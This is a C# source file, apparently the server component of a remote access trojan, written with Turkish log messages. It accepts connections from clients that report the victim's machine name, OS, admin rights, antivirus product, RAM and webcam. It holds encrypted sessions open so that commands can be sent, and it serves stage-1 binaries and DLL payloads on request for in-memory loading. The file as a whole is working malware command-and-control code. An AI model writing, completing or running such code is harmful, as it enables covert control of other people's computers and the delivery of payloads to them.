// Dosya: Net/SessionManager.cs
//using App.Service.Build;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace App.Service
{
    public class SessionManager
    {
        TcpListener _listener;
        volatile bool _running;

        public bool Listening { get { return _running; } }
        public int Port { get; private set; }
        public string AesKey { get; set; }
        public readonly ConcurrentDictionary<string, ClientSession> Sessions = new ConcurrentDictionary<string, ClientSession>();
        public readonly HashSet<string> Blocked = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        public event Action<ClientSession> OnSession;
        public event Action<ClientSession> OnGone;
        public event Action<string, string> OnMessage;
        public event Action<string> OnLog;

        static string Norm(IPAddress a)
        {
            try { return a.IsIPv4MappedToIPv6 ? a.MapToIPv4().ToString() : a.ToString(); }
            catch { return a.ToString(); }
        }

        static string At(string[] p, int i)
        {
            return p != null && i >= 0 && i < p.Length && p[i] != null ? p[i] : "";
        }

        public bool Start(int port)
        {
            if (_running) return false;
            try
            {
                _listener = new TcpListener(IPAddress.IPv6Any, port);
                try { _listener.Server.DualMode = true; } catch { }
                _listener.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                _listener.Start(128);
                Port = port;
                _running = true;

                new Thread(AcceptLoop) { IsBackground = true }.Start();
                new Thread(SweepLoop) { IsBackground = true }.Start();

                Log("Dinleniyor: " + port);
                return true;
            }
            catch (Exception ex)
            {
                try
                {
                    _listener = new TcpListener(IPAddress.Any, port);
                    _listener.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                    _listener.Start(128);
                    Port = port;
                    _running = true;
                    new Thread(AcceptLoop) { IsBackground = true }.Start();
                    new Thread(SweepLoop) { IsBackground = true }.Start();
                    Log("Dinleniyor (v4): " + port);
                    return true;
                }
                catch
                {
                    Log("Dinleme hatası: " + ex.Message);
                    _listener = null;
                    return false;
                }
            }
        }

        public void Stop()
        {
            _running = false;
            try { if (_listener != null) _listener.Stop(); } catch { }
            _listener = null;

            foreach (var kv in Sessions.ToArray())
            {
                Sessions.TryRemove(kv.Key, out _);
                kv.Value.Alive = false;
                try { if (kv.Value.Tcp != null) kv.Value.Tcp.Close(); } catch { }
                try { OnGone?.Invoke(kv.Value); } catch { }
            }
            Log("Dinleme durduruldu.");
        }

        public void Kick(string ip)
        {
            foreach (var kv in Sessions)
            {
                if (!string.Equals(kv.Value.Ip, ip, StringComparison.OrdinalIgnoreCase)) continue;
                kv.Value.Alive = false;
                try { if (kv.Value.Tcp != null) kv.Value.Tcp.Close(); } catch { }
            }
        }

        void AcceptLoop()
        {
            while (_running)
            {
                TcpClient c;
                try { c = _listener.AcceptTcpClient(); }
                catch { if (!_running) return; continue; }

                c.NoDelay = true;
                c.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                string ip = Norm(((IPEndPoint)c.Client.RemoteEndPoint).Address);

                if (Blocked.Contains(ip))
                {
                    Log("Engelli IP reddedildi: " + ip);
                    try { c.Close(); } catch { }
                    continue;
                }

                new Thread(() => Handle(c, ip)) { IsBackground = true }.Start();
            }
        }

        void Handle(TcpClient c, string ip)
        {
            ClientSession s = null;
            PeekStream ps = null;
            bool ws = false;
            try
            {
                ps = new PeekStream(c.GetStream());
                int first = ps.PeekByte();
                if (first < 0) { c.Close(); return; }

                if (first == 0x16)
                {
                    var cert = Tls.ServerCert();
                    if (cert == null) { Log("TLS sertifikası üretilemedi, bağlantı reddedildi."); c.Close(); return; }

                    var ssl = new SslStream(ps, false);
                    ssl.AuthenticateAsServer(cert, false, SslProtocols.Tls12, false);
                    ps = new PeekStream(ssl);
                    first = ps.PeekByte();
                    if (first < 0) { c.Close(); return; }
                }

                byte[] head = ps.Peek(9);
                if (head.Length >= 7)
                {
                    string hs = Encoding.ASCII.GetString(head);
                    if (hs.StartsWith("MEM|REQ")) { ServeBin(c, ps, true, ip); return; }
                    if (hs.StartsWith("LOADER|RE")) { ServeBin(c, ps, false, ip); return; }
                }

                if (first == 'G')
                {
                    if (!Protocol.ServerWsHandshake(ps)) { Log("WS el sıkışması başarısız: " + ip); c.Close(); return; }
                    ws = true;
                }

                string hello = Protocol.Read(ps, null, ws);
                if (hello == null || !hello.StartsWith("HELLO|", StringComparison.Ordinal)) { c.Close(); return; }

                string[] p = hello.Split('|');
                if (p.Length < 13) { c.Close(); return; }

                bool clientEnc = At(p, 10) == "1";
                bool serverKey = !string.IsNullOrEmpty(AesKey);

                if (!clientEnc || !serverKey)
                {
                    Log("AES zorunlu: " + At(p, 3) + (clientEnc ? " (sunucuda anahtar yok)" : " (istemci sifresiz)") + " → reddedildi.");
                    try { c.Close(); } catch { }
                    return;
                }

                int up = 0;
                int.TryParse(At(p, 11), out up);
                int mons = 1;
                int.TryParse(At(p, 12), out mons);

                string salt = Protocol.NewSalt();
                Protocol.WriteRaw(ps, "SALT|" + salt, ws);
                string key = AesKey + "|" + salt;

                s = new ClientSession
                {
                    Sid = At(p, 1),
                    Ip = ip,
                    Tag = At(p, 2),
                    UserPc = At(p, 3),
                    Version = At(p, 4),
                    Os = At(p, 5),
                    IsAdmin = At(p, 6) == "1",
                    Av = At(p, 7),
                    Ram = At(p, 8),
                    Cam = At(p, 9),
                    Monitors = Math.Max(1, Math.Min(8, mons)),
                    Encrypted = true,
                    UptimeSec = up,
                    Key = key,
                    Tcp = c,
                    Stream = ps,
                    Ws = ws
                };

                ClientSession old;
                if (Sessions.TryGetValue(s.Sid, out old) && old != s)
                {
                    old.Alive = false;
                    try { if (old.Tcp != null) old.Tcp.Close(); } catch { }
                }

                Sessions[s.Sid] = s;
                OnSession?.Invoke(s);
                Log("Bağlandı: " + s.UserPc + " (" + ip + ")" + " [AES/session]" + (ws ? " [ws]" : ""));

                while (s.Alive && _running)
                {
                    string msg = Protocol.Read(ps, s.Key, ws);
                    if (msg == null) break;
                    s.LastSeen = DateTime.UtcNow;
                    if (msg == "PING") continue;
                    OnMessage?.Invoke(s.Sid, msg);
                }
            }
            catch { }
            finally
            {
                if (s != null)
                {
                    s.Alive = false;
                    ClientSession cur;
                    if (Sessions.TryGetValue(s.Sid, out cur) && cur == s) Sessions.TryRemove(s.Sid, out _);
                    OnGone?.Invoke(s);
                    Log("Ayrıldı: " + s.UserPc);
                }
                try { c.Close(); } catch { }
            }
        }

        void ServeBin(TcpClient c, Stream ns, bool stage1, string ip)
        {
            try
            {
                byte[] bin = stage1 ? LoaderBin.GetLatestStage1() : LoaderBin.GetLatestDll();
                string resp;

                if (bin != null && bin.Length > 0)
                {
                    resp = (stage1 ? "MEM|BIN|" : "LOADER|BIN|") + Convert.ToBase64String(bin);
                    LoaderBin.Status[ip] = (stage1 ? "Stage1 " : "DLL ") + bin.Length + " B @ " + DateTime.Now.ToString("HH:mm:ss");
                    Log("İkili gönderildi (" + (bin.Length / 1024) + " KB) → " + ip);
                }
                else
                {
                    resp = stage1 ? "MEM|IDLE" : "LOADER|IDLE";
                    Log("İkili yok, IDLE → " + ip);
                }

                byte[] body = Encoding.UTF8.GetBytes(resp);
                byte[] frame = new byte[4 + body.Length];
                BitConverter.GetBytes(body.Length).CopyTo(frame, 0);
                body.CopyTo(frame, 4);
                ns.Write(frame, 0, frame.Length);
                ns.Flush();
            }
            catch { }
            finally { try { c.Close(); } catch { } }
        }

        void SweepLoop()
        {
            while (_running)
            {
                Thread.Sleep(5000);
                var now = DateTime.UtcNow;
                foreach (var kv in Sessions)
                {
                    if ((now - kv.Value.LastSeen).TotalSeconds < 150) continue;
                    kv.Value.Alive = false;
                    try { if (kv.Value.Tcp != null) kv.Value.Tcp.Close(); } catch { }
                }
            }
        }

        public bool Send(string sid, string command)
        {
            ClientSession s;
            if (string.IsNullOrEmpty(sid)) return false;
            if (!Sessions.TryGetValue(sid, out s) || !s.Alive || s.Stream == null) return false;
            try
            {
                lock (s.WriteLock) Protocol.Write(s.Stream, command, s.Key, s.Ws);
                return true;
            }
            catch
            {
                s.Alive = false;
                try { if (s.Tcp != null) s.Tcp.Close(); } catch { }
                return false;
            }
        }

        void Log(string m) { if (OnLog != null) OnLog(m); }
    }
}